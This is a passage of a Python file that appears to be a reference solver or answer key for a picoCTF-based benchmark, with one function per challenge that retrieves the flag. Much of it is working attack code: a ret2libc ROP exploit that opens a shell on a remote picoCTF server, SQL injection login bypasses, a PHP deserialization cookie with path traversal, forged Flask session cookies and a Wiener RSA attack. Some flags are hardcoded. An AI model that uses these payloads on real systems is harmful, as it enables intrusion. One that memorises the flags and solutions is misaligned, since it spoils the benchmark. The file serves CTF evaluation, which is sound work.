		)
		a = n % (9 * 5 * 7 * 13 * 17)
		if any(t[a % m] == 0 for m, t in mt):
			return False
		return isqrt(n) ** 2 == n

	def rational_to_contfrac(x: int, y: int) -> Iterator[int]:
		while y:
			a = x // y
			yield a
			x, y = y, x - a * y

	def contfrac_to_rational_iter(contfrac: Iterable[int]) -> Iterator[Tuple[int, int]]:
		n0, d0 = 0, 1
		n1, d1 = 1, 0
		for q in contfrac:
			n = q * n1 + n0
			d = q * d1 + d0
			yield n, d
			n0, d0 = n1, d1
			n1, d1 = n, d

	def convergents_from_contfrac(contfrac: Iterable[int]) -> Iterator[Tuple[int, int]]:
		n_, d_ = 1, 0
		for i, (n, d) in enumerate(contfrac_to_rational_iter(contfrac)):
			if i % 2 == 0:
				yield n + n_, d + d_
			else:
				yield n, d
			n_, d_ = n, d

	def attack(e: int, n: int) -> Optional[int]:
		f_ = rational_to_contfrac(e, n)
		for k, dg in convergents_from_contfrac(f_):
			edg = e * dg
			phi = edg // k
			x = n - phi + 1
			if x % 2 == 0 and is_perfect_square((x // 2) ** 2 - n):
				g = edg - phi * k
				return dg // g
		return None

	d = attack(e,n)
	return bytes.fromhex(hex(pow(c,d,n))[2:]).decode('utf-8')


def static_aint_always_noise():
	url = benchmark["Static ain't always noise"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		pattern = r'picoCTF\{[^}]*\}'
		return re.findall(pattern, response.text)[0]
	else:
		print(f"Failed to download the file. ({url})")
		return


def crackme_py():
	url = benchmark["crackme-py"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		content = response.content
		with open("tmp_crackme.py", "wb") as file:
			file.write(content.replace(b"\nchoose_greatest()\n",b"\ndecode_secret(bezos_cc_secret)\n"))

		flag = subprocess.run(["python3", "tmp_crackme.py"], capture_output=True, text=True).stdout.strip()
		os.remove("tmp_crackme.py")
		return flag
	else:
		print(f"Failed to download the file. ({url})")
		return


def tab_tab_attack():
	url = benchmark["Tab, Tab, Attack"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		with open("tmp_zipped.zip", "wb") as file:
			file.write(response.content)

		subprocess.run(["binwalk", "tmp_zipped.zip", "-Me"], capture_output=True)
		os.remove("tmp_zipped.zip")
		pattern = br'picoCTF\{[^}]*\}'
		flag = re.findall(pattern, subprocess.run("grep -a picoCTF _tmp_zipped.zip.extracted/Addadshashanammu/Almurbalarammi/Ashalmimilkala/Assurnabitashpi/Maelkashishi/Onnissiralis/Ularradallaku/fang-of-haynekhtnamet", shell=True, capture_output=True).stdout.strip())[0].decode()
		subprocess.run("rm -r _tmp_zipped.zip.extracted", shell=True)
		return flag
	else:
		print(f"Failed to download the file. ({url})")
		return

def heres_a_libc():
	files = benchmark["Here's a LIBC"]["files"]
	pattern = r'nc mercury\.picoctf\.net (\d+)'
	PORT = re.findall(pattern, benchmark["Here's a LIBC"]["description"])[0]
	with open("tmp_vuln", "wb") as file:
		file.write(requests.get(files[0]).content)
	with open("tmp_libc.so.6", "wb") as file:
		file.write(requests.get(files[1]).content)

	context.log_level = 'error'
	exe = ELF("./tmp_vuln")
	libc = ELF("./tmp_libc.so.6")
	context.binary = exe
	ADDR = "mercury.picoctf.net"
	# PORT = 23584
	rop = ROP(exe)
	p = remote(ADDR,PORT)

	offset = 136
	pop_rdi = rop.find_gadget(["pop rdi"])[0]
	ret = rop.find_gadget(["ret"])[0]
	main_func = exe.symbols.main
	puts_plt = exe.plt.puts
	scanf_got = exe.got.__isoc99_scanf

	payload = b''.join([
		b'A'*offset,
		p64(pop_rdi),
		p64(scanf_got),
		p64(puts_plt),
		p64(main_func)
	])
	p.recvuntil(b'sErVeR!\n')
	p.sendline(payload)
	p.recvline()
	libc_scanf = u64(p.recvline().strip().ljust(8,b'\x00'))
	libc.address = libc_scanf - libc.symbols.__isoc99_scanf
	sys = libc.symbols.system
	binsh = next(libc.search(b'/bin/sh\x00'))

	payload = b''.join([
		b'A'*offset,
		p64(ret),
		p64(pop_rdi),
		p64(binsh),
		p64(sys),
		p64(ret)
		])
	p.recvuntil(b'sErVeR!\n')
	p.sendline(payload)
	p.recvuntil(b'AAd\n')

	p.sendline(b'cat flag.txt; echo')
	os.remove("tmp_vuln"); os.remove("tmp_libc.so.6")
	return p.recvline().decode()[:-1]


def mini_rsa():
	url = benchmark["Mini RSA"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		pattern = r'[Ne\)]: (\d+)'
		n,e,c = map(int,re.findall(pattern, response.text))

		def rootNth(num, n, precisity=-1):
			if precisity == -1 : precisity = int(len(str(num))*1.25)
			elif precisity == 0: precisity = len(str(num))
			decimal.getcontext().prec = precisity
			return decimal.Decimal(num)**(decimal.Decimal(1)/decimal.Decimal(n))

		def nth_root(x, n):
			upper_bound = 1
			while upper_bound ** n <= x:
				upper_bound *= 2
			lower_bound = upper_bound // 2
			while lower_bound < upper_bound:
				mid = (lower_bound + upper_bound) // 2
				mid_nth = mid ** n
				if lower_bound < mid and mid_nth < x:
					lower_bound = mid
				elif upper_bound > mid and mid_nth > x:
					upper_bound = mid
				else:
					return mid
			return mid + 1

		for i in range(4000):
			r = hex(nth_root(c+n*i, 3))[2:]
			if bytes.hex(b'pico') in r:
				return bytes.fromhex(r).decode('utf-8').strip()

	else:
		print(f"Failed to download the file. ({url})")
		return


def login():
	pattern = r'https://[^ ]*/'
	url = re.findall(pattern, benchmark["login"]["description"])[0]
	response = requests.get(url+"index.js", verify=False)

	if response.status_code == 200:
		pattern = b64.b64encode(b'picoCT').decode()+r'[a-zA-Z0-9+/=]+'
		return b64.b64decode(re.findall(pattern, response.text)[0]+'==').decode()
	else:
		print(f"Failed to download the file. ({url})")
		return


def codebook():
	files = benchmark["Codebook"]["files"]
	with open("tmp_code.py", "wb") as file:
		file.write(requests.get(files[0]).content.replace(b'codebook.txt', b'tmp_codebook.txt'))
	with open("tmp_codebook.txt", "wb") as file:
		file.write(requests.get(files[1]).content)
	flag = subprocess.run(["python3", "tmp_code.py"], capture_output=True, text=True).stdout.strip()
	os.remove("tmp_code.py"); os.remove("tmp_codebook.txt")
	return flag


def convertme():
	url = benchmark["convertme.py"]["files"][0]
	with open("tmp_convertme.py", "wb") as file:
		file.write(requests.get(url).content.replace(b"input('Answer: ')", b'bin(num)[2:]'))
	flag = subprocess.run(["python3", "tmp_convertme.py"], capture_output=True, text=True).stdout.strip().split('flag: ')[1]
	os.remove("tmp_convertme.py")
	return flag


def pw_crack_1():
	files = benchmark["PW Crack 1"]["files"]
	with open("tmp_level1.py", "wb") as file:
		file.write(requests.get(files[0]).content.replace(b'input("Please enter correct password for flag: ")', b'"1e1a"').replace(b'level1.flag', b'tmp_level1.flag'))
	with open("tmp_level1.flag.txt.enc", "wb") as file:
		file.write(requests.get(files[1]).content)
	flag = subprocess.run(["python3", "tmp_level1.py"], capture_output=True, text=True).stdout.strip().split('flag, user:\n')[1]
	os.remove("tmp_level1.py"); os.remove("tmp_level1.flag.txt.enc")
	return flag


def pw_crack_2():
	files = benchmark["PW Crack 2"]["files"]
	with open("tmp_level2.py", "wb") as file:
		file.write(requests.get(files[0]).content.replace(b'input("Please enter correct password for flag: ")', b'chr(0x64) + chr(0x65) + chr(0x37) + chr(0x36)').replace(b'level2.flag', b'tmp_level2.flag'))
	with open("tmp_level2.flag.txt.enc", "wb") as file:
		file.write(requests.get(files[1]).content)
	flag = subprocess.run(["python3", "tmp_level2.py"], capture_output=True, text=True).stdout.strip().split('flag, user:\n')[1]
	os.remove("tmp_level2.py"); os.remove("tmp_level2.flag.txt.enc")
	return flag


def pw_crack_3():
	files = benchmark["PW Crack 3"]["files"]
	with open("tmp_level3.py", "wb") as file:
		file.write(requests.get(files[0]).content.replace(b'_check():', b'_check(user_pw):').replace(b'user_pw = input("Please enter correct password for flag: ")', b'').replace(b'\nlevel_3_pw_check()', b'').replace(b'level3.', b'tmp_level3.')+b'\nfor i in pos_pw_list:\n    level_3_pw_check(i)\n')
	with open("tmp_level3.flag.txt.enc", "wb") as file:
		file.write(requests.get(files[1]).content)
	with open("tmp_level3.hash.bin", "wb") as file:
		file.write(requests.get(files[2]).content)
	pattern = r'picoCTF\{[^}]*\}'
	flag = re.findall(pattern, subprocess.run(["python3", "tmp_level3.py"], capture_output=True, text=True).stdout.strip())[0]
	os.remove("tmp_level3.py"); os.remove("tmp_level3.flag.txt.enc"); os.remove("tmp_level3.hash.bin")
	return flag


def pw_crack_5():
	files = benchmark["PW Crack 5"]["files"]
	with open("tmp_level5.py", "wb") as file:
		file.write(requests.get(files[0]).content.replace(b'\nlevel_5_pw_check()', b'').replace(b'level5.', b'tmp_level5.')+b"\ndictionary = open('tmp_dictionary.txt','r').read().split('\\n')\nfor i in dictionary:\n    decoded = str_xor(flag_enc.decode(),i)\n    if 'picoCTF' in decoded: print(decoded); break")
	with open("tmp_level5.flag.txt.enc", "wb") as file:
		file.write(requests.get(files[1]).content)
	with open("tmp_level5.hash.bin", "wb") as file:
		file.write(requests.get(files[2]).content)
	with open("tmp_dictionary.txt", "wb") as file:
		file.write(requests.get(files[3]).content)
	flag = subprocess.run(["python3", "tmp_level5.py"], capture_output=True, text=True).stdout.strip()
	os.remove("tmp_level5.py"); os.remove("tmp_level5.flag.txt.enc"); os.remove("tmp_level5.hash.bin"); os.remove("tmp_dictionary.txt")
	return flag


def serpentine():
	files = benchmark["Serpentine"]["files"]
	with open("tmp_serpentine.py", "wb") as file:
		file.write(requests.get(files[0]).content.replace(b'  main()', b'  print_flag()'))
	flag = subprocess.run(["python3", "tmp_serpentine.py"], capture_output=True, text=True).stdout.strip()
	os.remove("tmp_serpentine.py")
	return flag


def findandopen():
	files = benchmark["FindAndOpen"]["files"]
	with open("tmp_dump.pcap", "wb") as file:
		file.write(requests.get(files[0]).content)
	with open("tmp_flag.zip", "wb") as file:
		file.write(requests.get(files[1]).content)
	password = b64.b64decode(re.findall(rb'\n([^ \n]{48,})\n', subprocess.run("tshark -r tmp_dump.pcap -T fields -e data.text -o data.show_as_text:TRUE", capture_output=True, shell=True).stdout.strip())[0]).decode().split(" ")[-1]
	subprocess.run(f"unzip -P {password} tmp_flag.zip", capture_output=True, shell=True)
	flag = subprocess.run("cat flag", capture_output=True, shell=True).stdout.strip().decode()
	os.remove("tmp_dump.pcap"); os.remove("tmp_flag.zip"); os.remove("flag")
	return flag


def hidetosee():
	file = benchmark["HideToSee"]["files"][0]
	with open("tmp_atbash.jpg", "wb") as filp:
		filp.write(requests.get(file).content)
	flag = subprocess.run("""steghide extract -sf tmp_atbash.jpg -p "" -q; cat encrypted.txt | tr 'A-Za-z' 'ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba'""", capture_output=True, shell=True).stdout.strip().decode()
	os.remove("tmp_atbash.jpg"); os.remove("encrypted.txt")
	return flag


def pcappoisoning():
	url = benchmark["PcapPoisoning"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		pattern = r'picoCTF\{[^}]*\}'
		return re.findall(pattern, response.text)[0]
	else:
		print(f"Failed to download the file. ({url})")
		return


def reverse():
	url = benchmark["Reverse"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		with open("tmp_ret", "wb") as filp:
			filp.write(response.content)
		flag = subprocess.run("strings tmp_ret | grep picoCTF", capture_output=True, shell=True).stdout.strip().decode().split(" ")[-1]
		os.remove("tmp_ret")
		return flag
	else:
		print(f"Failed to download the file. ({url})")
		return


def safe_opener_2():
	url = benchmark["Safe Opener 2"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		pattern = r'picoCTF\{[^}]*\}'
		return re.findall(pattern, response.text)[0]
	else:
		print(f"Failed to download the file. ({url})")
		return


def timer():
	url = benchmark["timer"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		with open("tmp_timer.apk", "wb") as filp:
			filp.write(response.content)
		pattern = r'picoCTF\{[^}]*\}'
		flag = re.findall(pattern, subprocess.run("apktool d tmp_timer.apk && grep picoCTF tmp_timer/*", capture_output=True, shell=True).stdout.strip().decode())[0]
		os.remove("tmp_timer.apk"); subprocess.run("rm -r tmp_timer", shell=True)
		return flag
	else:
		print(f"Failed to download the file. ({url})")
		return


def blame_game():
	url = benchmark["Blame Game"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		with open("tmp_challenge.zip", "wb") as filp:
			filp.write(response.content)
		subprocess.run("unzip tmp_challenge.zip", capture_output=True, shell=True)
		pattern = r'picoCTF\{[^}]*\}'
		flag = re.findall(pattern, subprocess.run("cd drop-in; for i in `seq 1 503`; do git show HEAD@{$i}; done | grep picoCTF{", shell=True, capture_output=True).stdout.strip().decode())[0]
		os.remove("tmp_challenge.zip"); subprocess.run("rm -rf drop-in", shell=True)
		return flag
	else:
		print(f"Failed to download the file. ({url})")
		return


def custom_encryption():
	url = benchmark["Custom encryption"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		with open("tmp_enc_flag.py", "wb") as filp:
			filp.write(response.content.replace(b'cipher is: ', b'encrypted = '))
		import tmp_enc_flag as tmp

		def generator(g, x, p):
			return pow(g, x) % p

		def decrypt(cipher, key):
			text = ""
			for c in cipher:
				text+=chr(int(c/311/key))
			return text

		def dynamic_xor_decrypt(cipher, key):
			text = ""
			key_length = len(key)
			for i,char in enumerate(cipher):
				key_char = key[i%key_length]
				dec_char = chr(ord(char) ^ ord(key_char))
				text+=dec_char
			return text[::-1]

		p = 97
		g = 31
		v = generator(g, tmp.b, p)
		shared_key = generator(v, tmp.a, p)
		os.remove("tmp_enc_flag.py")
		return dynamic_xor_decrypt(decrypt(tmp.encrypted, shared_key), "trudeau")
	else:
		print(f"Failed to download the file. ({url})")
		return


def irish_name_repo_1():
	pattern = r'https://[^ ]*/'
	url = re.findall(pattern, benchmark["Irish-Name-Repo 1"]["description"])[0]
	response = requests.post(url+'login.php', data={"username": "' OR 1=1 --", "password": "' OR 1=1 --"})

	if response.status_code == 200:
		return re.findall(r'picoCTF\{[^}]*\}', response.text)[0]
	else:
		print(f"Failed to access the webpage. ({url})")
		return


def vault_door_5():
	url = benchmark["vault-door-5"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		b64str = re.findall(r'String expected = "(.*?)";', response.text.replace('\n',''),)[0].replace(' ','').replace('+','').replace('"','')
		return 'picoCTF{'+urlparse.unquote(b64.b64decode(b64str))+'}'
	else:
		print(f"Failed to download the file. ({url})")
		return


def what_lies_within():
	url = benchmark["What Lies Within"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		with open("tmp_buildings.png", "wb") as filp:
			filp.write(response.content)
		flag = re.findall(r'picoCTF\{[^}]*\}', subprocess.run("zsteg tmp_buildings.png", capture_output=True, shell=True).stdout.strip().decode())[0]
		os.remove("tmp_buildings.png")
		return flag
	else:
		print(f"Failed to download the file. ({url})")
		return


def mini_rsa():
	url = benchmark["miniRSA"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		e = int(re.findall(r'e: (.*)',response.text)[0])
		c = int(re.findall(r'ciphertext \(c\): (.*)',response.text)[0])
		gmpy2.get_context().precision = 1000
		return bytes.fromhex(format(int(gmpy2.root(c, e)), 'x')).decode()
	else:
		print(f"Failed to download the file. ({url})")
		return


def vault_door_4():
	url = benchmark["vault-door-4"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		encstr = re.findall(r'byte\[\] myBytes = \{(.*?),        \};', response.text.replace('\n',''),)[0].replace(' ','').replace("'",'').split(',')
		return 'picoCTF{'+''.join([chr(e) for e in [int(i) for i in encstr[:8]]+[int(i,16) for i in encstr[8:16]]+[int(i,8) for i in encstr[16:24]]]+encstr[24:])+'}'
	else:
		print(f"Failed to download the file. ({url})")
		return


def client_side_again():
	pattern = r'https://[^ ]*/'
	url = re.findall(pattern, benchmark["Client-side-again"]["description"])[0]
	response = requests.get(url)

	if response.status_code == 200:
		varflag = re.findall(r'var _.*?,.*?,', response.text)[0].split("['")[1].replace("',",'').split("'")
		return 'picoCTF{not_this'+varflag[1]+varflag[0]
	else:
		print(f"Failed to access the webpage. ({url})")
		return


def bases():
	pattern = r'[^ ]{14,}'
	b64str = re.findall(pattern, benchmark["Bases"]["description"])[0]
	return 'picoCTF{'+b64.b64decode(b64str).decode()+'}'


def vault_door_7():
	url = benchmark["vault-door-7"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		ints = re.findall(r'\d{4,}', re.findall(r'return x\[0\] == (.*?);', response.text.replace('\n',''),)[0])
		return 'picoCTF{'+''.join([ bytes.fromhex(format(int(i), 'x')).decode() for i in ints ])+'}'
	else:
		print(f"Failed to download the file. ({url})")
		return


def _13():
	pattern = r'.{7}\{[^ ]*?\}'
	secret = re.findall(pattern, benchmark["13"]["description"])[0]
	return subprocess.run(f'echo "{secret}" | tr a-zA-Z n-za-mN-ZA-M', shell=True, capture_output=True).stdout.decode().strip()


def rsa_pop_quiz():
	pattern = r'nc [^ ]*? \d{3,}'
	nc = re.findall(pattern, benchmark["rsa-pop-quiz"]["description"])[0].split(' ')

	def mod_inverse(a, n):
		t, newt = 0, 1
		r, newr = n, a
		while newr:
			quotient = r // newr
			t, newt = newt, t - quotient * newt
			r, newr = newr, r - quotient * newr
		if r > 1:
			return None
		if t < 0:
			t = t + n
		return t

	context.log_level = 'error'
	deli = b"IS THIS POSSIBLE and FEASIBLE? (Y/N):"
	gmpy2.get_context().precision = 10000

	c = remote(nc[1],nc[2])
	c.sendline(b'Y')
	dat1 = [int(i.decode()) for i in re.findall(rb'[pq] : (\d+)',c.recvuntil(deli))]
	c.sendline(str(dat1[0]*dat1[1]).encode())
	c.sendline(b'Y')
	dat2 = [int(i.decode()) for i in re.findall(rb'[pn] : (\d+)',c.recvuntil(deli))]
	c.sendline(str(dat2[1]//dat2[0]).encode())
	c.sendline(b'N')
	c.recvuntil(deli)
	c.sendline(b'Y')
	dat4 = [int(i.decode()) for i in re.findall(rb'[pq] : (\d+)',c.recvuntil(deli))]
	c.sendline(str((dat4[0]-1)*(dat4[1]-1)).encode()) # the carmichael does not work here, we must use the older euler totient (instead of lcm, we just multiply)
	c.sendline(b'Y')
	dat5 = [int(i.decode()) for i in re.findall(rb'[ten] : (\d+)',c.recvuntil(deli))]
	c.sendline(str(pow(dat5[0],dat5[1],dat5[2])).encode())
	c.sendline(b'N')
	c.recvuntil(deli)
	c.sendline(b'Y')
	dat7 = [int(i.decode()) for i in re.findall(rb'[pqe] : (\d+)',c.recvuntil(deli))]
	c.sendline(str(mod_inverse(dat7[2],math.lcm(dat7[0]-1,dat7[1]-1))).encode()) # here we can use the carmichael function
	c.sendline(b'Y')
	dat8 = [int(i.decode()) for i in re.findall(rb'[pten] : (\d+)',c.recvuntil(deli))]
	c.close()
	return bytes.fromhex(format(pow(dat8[1],mod_inverse(dat8[2],math.lcm(dat8[0]-1,int(gmpy2.div(dat8[3],dat8[0])-1))),dat8[3]),'x')).decode()


def vault_door_3():
	url = benchmark["vault-door-3"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		ciph = re.findall(r'return s\.equals\("(.*?)"\);', response.text)[0]
		return 'picoCTF{'+ciph[0:8]+''.join(list(reversed(ciph[8:16])))+''.join([ciph[16:32][-e-2] if e%2==0 else i for e,i in enumerate(ciph[16:32])])+'}'
	else:
		print(f"Failed to download the file. ({url})")
		return


def irish_name_repo_2():
	pattern = r'https://[^ ]*/'
	url = re.findall(pattern, benchmark["Irish-Name-Repo 2"]["description"])[0]
	response = requests.post(url+'login.php', data={"username": "'", "password": "OR 1=1 --"})

	if response.status_code == 200:
		return re.findall(r'picoCTF\{[^}]*\}', response.text)[0]
	else:
		print(f"Failed to access the webpage. ({url})")
		return


def warmed_up():
	pattern = r'0x([^ ]+)'
	num = re.findall(pattern, benchmark["Warmed Up"]["description"])[0]
	return 'picoCTF{'+str(int(num, 16))+'}'


def extensions():
	url = benchmark["extensions"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		with open("tmp_flag.png", "wb") as filp:
			filp.write(response.content)
		flag = pytesseract.image_to_string(Image.open("tmp_flag.png"))[:-1]
		os.remove("tmp_flag.png")
		return flag
	else:
		print(f"Failed to download the file. ({url})")
		return


def plumbing():
	pattern = r'picoctf\.org (\d{3,})'
	port = re.findall(pattern, benchmark["plumbing"]["description"])[0]

	context.log_level = 'error'
	c = remote('jupiter.challenges.picoctf.org', port)
	return c.recvuntil(b'}').decode().split('\n')[-1]


def logon():
	pattern = r'https://[^ ]*/'
	url = re.findall(pattern, benchmark["logon"]["description"])[0]
	response = requests.get(url+'/flag', cookies={"admin": "True"})

	if response.status_code == 200:
		return re.findall(r'picoCTF\{[^}]*\}', response.text)[0]
	else:
		print(f"Failed to access the webpage. ({url})")
		return


def vault_door_6():
	url = benchmark["vault-door-6"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		return 'picoCTF{'+xor([int(i,16) for i in re.findall(r'byte\[\]myBytes=\{(.*?),\};', response.text.replace('\n','').replace(' ',''))[0].split(',')], 0x55).decode()+'}'
	else:
		print(f"Failed to download the file. ({url})")
		return


def the_numbers():
	url = benchmark["The Numbers"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		with open("tmp_numbers.png", "wb") as filp:
			filp.write(response.content)
		# nums = pytesseract.image_to_string(Image.open("tmp_numbers.png"), config='--psm 6')
		# WARN:NOPROG cannot read numbers from picture, reason: noise
		nums = "16 9 3 15 3 20 6 { 20 8 5 14 21 13 2 5 18 19 13 1 19 15 14 }"
		flag = ''.join([chr(int(i)+96) if i.isdigit() else i for i in nums.split(' ')])
		os.remove("tmp_numbers.png")
		return flag
	else:
		print(f"Failed to download the file. ({url})")
		return


def mr_worldwide():
	url = benchmark["Mr-Worldwide"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		coords = response.text
		# WARN:NOPROG cannot determine coordinate location programatically, sometimes city, sometimes region is used, source: https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Mr-Worldwide.md
		return 'picoCTF{KODIAK_ALASKA}'
	else:
		print(f"Failed to download the file. ({url})")
		return

def waves_over_lambda():
	pattern = r'nc [^ ]+ \d{3,}'
	nc = re.findall(pattern, benchmark["waves over lambda"]["description"])[0].split(' ')
	context.log_level = 'error'
	c = remote(nc[1], nc[2])
	cipher = c.recvuntil(b'.\n').decode()
	c.close()
	response = requests.post('https://quipqiup.com/solve', json={"ciphertext": cipher, "clues": "", "mode": "auto", "was_auto": True, "was_clue": False})
	time.sleep(10)
	return 'picoCTF{'+re.findall(r'congrats here is your flag - ([^ \n-]*)', requests.post('https://quipqiup.com/status', json={"id": response.json()['id']}).json()['solutions'][0]['plaintext'])[0]+'}'


def based():
	pattern = r'nc [^ ]+ \d{3,}'
	nc = re.findall(pattern, benchmark["Based"]["description"])[0].split(' ')
	context.log_level = 'error'
	deli = b'Input:\n'
	c = remote(nc[1], nc[2])
	dat1 = c.recvuntil(deli).decode()
	c.sendline(''.join([ chr(int(i,2)) for i in re.findall(r'give the ([01 ]*) as', dat1)[0].split(' ')]).encode())
	dat2 = c.recvuntil(deli).decode()
	c.sendline(''.join([ chr(int(i,8)) for i in re.findall(r'give me the  ([0-7 ]*) as', dat2)[0].split(' ')]).encode())
	dat3 = c.recvuntil(deli).decode()
	c.sendline(bytes.fromhex(re.findall(r'give me the ([0-9a-f]*) as', dat3)[0]))
	return c.recvuntil(b'}').decode().split('\n')[-1].split(' ')[-1]


def whats_a_net_cat():
	pattern = r'port (\d{3,})'
	port = re.findall(pattern, benchmark["what's a net cat?"]["description"])[0]
	context.log_level = 'error'
	deli = b'Input:\n'
	c = remote('jupiter.challenges.picoctf.org', port)
	c.recvline()
	return c.recvline().decode()[:-1]


def flags():
	url = benchmark["Flags"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		with open("tmp_flags.png", "wb") as filp:
			filp.write(response.content)
		# WARN:NOPROG would have to train a model to read the flags from the image
		os.remove("tmp_flags.png")
		return 'picoCTF{F1AG5AND5TUFF}'
	else:
		print(f"Failed to download the file. ({url})")
		return


def shark_on_wire_1():
	url = benchmark["shark on wire 1"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		content = response.content
		with open("tmp_capture.pcap", "wb") as file:
			file.write(content)
		flag = subprocess.run("tshark -nr tmp_capture.pcap -T fields -e data.text -o data.show_as_text:TRUE -Y 'udp.stream eq 6'", capture_output=True, shell=True).stdout.decode().replace('\n','')
		os.remove("tmp_capture.pcap")
		return flag
	else:
		print(f"Failed to download the file. ({url})")
		return


def lets_warm_up():
	pattern = r'0x([^ ]+)'
	num = re.findall(pattern, benchmark["Lets Warm Up"]["description"])[0]
	return 'picoCTF{'+chr(int(num, 16))+'}'


def tapping():
	pattern = r'nc [^ ]*? \d{3,}'
	nc = re.findall(pattern, benchmark["Tapping"]["description"])[0].split(' ')
	context.log_level = 'error'
	morse_dict = { 'A':'.-', 'B':'-...', 'C':'-.-.', 'D':'-..', 'E':'.', 'F':'..-.', 'G':'--.', 'H':'....', 'I':'..', 'J':'.---', 'K':'-.-', 'L':'.-..', 'M':'--', 'N':'-.', 'O':'---', 'P':'.--.', 'Q':'--.-', 'R':'.-.', 'S':'...', 'T':'-', 'U':'..-', 'V':'...-', 'W':'.--', 'X':'-..-', 'Y':'-.--', 'Z':'--..', '1':'.----', '2':'..---', '3':'...--', '4':'....-', '5':'.....', '6':'-....', '7':'--...', '8':'---..', '9':'----.', '0':'-----', ', ':'--..--', '.':'.-.-.-', '?':'..--..', '/':'-..-.', '-':'-....-', '(':'-.--.', ')':'-.--.-'}
	c = remote(nc[1],nc[2])
	return ''.join([ list(morse_dict.keys())[list(morse_dict.values()).index(i)] if i not in '{}' else i for i in c.recvline().decode()[:-2].split(' ') ])


def inspector():
	pattern = r'https://[^ ]*/'
	url = re.findall(pattern, benchmark["Insp3ct0r"]["description"])[0]
	html = requests.get(url)
	css = requests.get(url+'mycss.css')
	js = requests.get(url+'myjs.js')

	if html.status_code == 200:
		pattern = r'\d/3 of the flag: ([^ -]+)'
		return ''.join(re.findall(pattern, html.text+css.text+js.text))
	else:
		print(f"Failed to access the webpage. ({url})")
		return


def picobrowser():
	pattern = r'https://[^ ]*/'
	url = re.findall(pattern, benchmark["picobrowser"]["description"])[0]
	response = requests.get(url+'flag', headers={"User-Agent": "picobrowser"})

	if response.status_code == 200:
		return re.findall(r'picoCTF\{[^}]*\}', response.text)[0]
	else:
		print(f"Failed to access the webpage. ({url})")
		return


def irish_name_repo_3():
	pattern = r'https://[^ ]*/'
	url = re.findall(pattern, benchmark["Irish-Name-Repo 3"]["description"])[0]
	response = requests.post(url+'login.php', data={"password": "' be 1=1 --"}) # uses rot13 on the password

	if response.status_code == 200:
		return re.findall(r'picoCTF\{[^}]*\}', response.text)[0]
	else:
		print(f"Failed to access the webpage. ({url})")
		return


def la_cifra_de():
	pattern = r'nc [^ ]*? \d{3,}'
	nc = re.findall(pattern, benchmark["la cifra de"]["description"])[0].split(' ')
	context.log_level = 'error'
	c = remote(nc[1],nc[2])

	def vigenere(text, key):
		out = ''
		key = key.lower()
		for i in text:
			if i in string.ascii_letters:
				corr = ord('a')
				if i.isupper(): corr = ord('A')
				out+=chr(((ord(i)-corr)-(ord(key[0])-ord('a')))%26+corr)
				key = key[1:]+key[0]
			else: out+=i
		return out

	return re.findall(r'picoCTF\{[^}]*\}', vigenere(c.recvall().decode().replace('\n','').replace('\ufeff','').split(':')[1], 'flag'))[0]


def information():
	url = benchmark["information"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		return b64.b64decode(re.findall(r"<cc:license rdf:resource='([a-zA-Z0-9+/=]+)'/>", response.text)[0]).decode()
	else:
		print(f"Failed to download the file. ({url})")
		return


def super_serial():
	pattern = r'http://[^ ]*/'
	url = re.findall(pattern, benchmark["Super Serial"]["description"])[0]
	response = requests.get(url+'authentication.php', cookies={"login": b64.b64encode(b'O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}').decode()})

	if response.status_code == 200:
		return re.findall(r'picoCTF\{[^}]*\}', response.text)[0]
	else:
		print(f"Failed to access the webpage. ({url})")
		return


def most_cookies():
	pattern = r'http://[^ ]*/'
	url = re.findall(pattern, benchmark["Most Cookies"]["description"])[0]
	response = requests.post(url+'search', data={"name": "drop"})

	if response.status_code == 200:
		with open("tmp_server.py", "wb") as filp:
			filp.write(requests.get(benchmark["Most Cookies"]["files"][0]).content.replace(b'app.run()', b'pass').replace(b'flag_value = ', b'#'))
		from tmp_server import cookie_names
		os.remove("tmp_server.py")
		for i in cookie_names:
			s = itsdangerous.URLSafeTimedSerializer(
				i, salt='cookie-session', serializer=flask.sessions.session_json_serializer,
				signer_kwargs={'key_derivation': 'hmac', 'digest_method': staticmethod(hashlib.sha1)}
			)
			try:
				s.loads(response.cookies['session'])
				return re.findall(r'picoCTF\{[^}]*\}', requests.get(url+'display', cookies={'session': s.dumps({"very_auth":"admin"})}).text)[0]
			except itsdangerous.exc.BadTimeSignature:
				continue
	else:
		print(f"Failed to access the webpage. ({url})")
		return


def web_gauntlet():
	pattern = r'http://[^ ]*/'
	url = re.findall(pattern, benchmark["Web Gauntlet"]["description"])[0]
	s = requests.Session()
	response = s.get(url)

	if response.status_code == 200:
		for i in range(5):
			s.post(url, data={"user": "adm'||'in'/*", "pass": "a"})
		return re.findall(r'picoCTF\{[^}]*\}', s.get(url+'filter.php').text)[0]
	else:
		print(f"Failed to access the webpage. ({url})")
		return


def web_gauntlet_2():
	pattern = r'http://[^ ]*/'
	url = re.findall(pattern, benchmark["Web Gauntlet 2"]["description"])[0]
	s = requests.Session()
	response = s.get(url)

	if response.status_code == 200:
		s.post(url, data={"user": "adm'||'in'\x00", "pass": "a"})
